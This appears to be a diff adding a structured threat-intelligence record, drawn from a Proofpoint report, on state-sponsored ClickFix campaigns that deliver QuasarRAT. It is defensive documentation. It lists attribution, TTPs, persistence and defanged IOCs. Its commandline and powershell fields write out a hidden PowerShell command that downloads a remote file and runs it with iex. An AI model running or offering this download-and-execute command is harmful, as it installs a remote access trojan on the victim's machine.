@@ -1,0 +1,59 @@
+summary: "Proofpoint researchers discovered state-sponsored actors from North Korea, Iran, and Russia using the ClickFix social engineering technique within their campaigns. This technique involves instructing targets to copy and paste malicious commands into a terminal, often replacing installation/execution stages in existing infection chains."
+date: "March 2025"
+authors:
+  - "Proofpoint Researchers"
+attribution:
+  - threat_actor: TA427 (North Korea)
+  - threat_actor: TA450 (Iran)
+  - threat_actor: UNK_RemoteRogue (Russia)
+  - threat_actor: TA422 (Russia)
+malware_families:
+  - QuasarRAT
+  - Level (RMM software)
+
+TTPs:
+  processs:
+    - powershell.exe
+    - cmd.exe
+    - wscript.exe
+    - mshta.exe
+  commandline:
+    - "powershell -windowstyle hidden -Command iwr \"hxxps://securedrive.fin-tech[.]com/docs/en/t.vmd\" -OutFile \"$env:TEMP\\p\"; $c=Get-Content -Path \"$env:TEMP\\p\" -Raw; iex $c; 3Z5TY-76FR3-9G87H-7ZC56"
+    - "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\Documents\\temp.vbs"
+  powershell:
+    - "iwr \"hxxps://securedrive.fin-tech[.]com/docs/en/t.vmd\" -OutFile \"$env:TEMP\\p\"; $c=Get-Content -Path \"$env:TEMP\\p\" -Raw; iex $c"
+  scripting_engine:
+    - VBScript
+  registry_keys:
+    - "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
+  network_connections:
+    - process: powershell.exe
+      port: 80
+      destination: "38.180.157[.]197"
+  file_modifications:
+    - "$env:TEMP\\p"
+    - "%temp%\\temp.vbs"
+  persistence:
+    - Scheduled Task: Update-out-of-date-20240324001883765674 (runs temp.vbs every 19 minutes)
+    - Scheduled Task: Update-out-of-date-20240324001883765675 (unclear purpose, runs a non-existent VBS script every 20 minutes)
+  pipes: []
+  process_relations:
+    - powershell.exe -> VBScript (temp.vbs)
+    - VBScript (temp.vbs) -> Batch Script
+    - Batch Script -> PowerShell Script
+    - PowerShell Script -> QuasarRAT
+
+IOCs:
+  domains:
+    - "securedrive.fin-tech[.]com"
+    - "office[.]rsvp"
+    - "ukrtelecom[.]com"
+    - "ukrtelecom[.]eu"
+    - "raedom[.]store"
+  IPs:
+    - "38.180.157[.]197"
+    - "5.231.4[.]94"
+    - "80.66.66[.]197"
+  URLs:
+    - "hxxps://securedrive.fin-tech[.]com/docs/en/t.vmd"
+reference: https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix
